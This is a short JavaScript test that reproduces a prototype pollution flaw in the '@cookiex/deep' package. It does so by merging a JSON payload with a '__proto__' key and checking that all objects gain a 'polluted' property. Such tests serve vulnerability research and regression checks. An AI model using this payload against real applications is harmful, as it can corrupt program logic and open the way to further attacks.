test("prototype pollution in @cookiex/deep", () => {
  const deep = require("@cookiex/deep");
  expect({}.polluted).toBe(undefined);

  const target = {};
  deep.default(target, JSON.parse('{"__proto__":{"polluted":"yes"}}'));

  expect({}.polluted).toBe("yes");
});
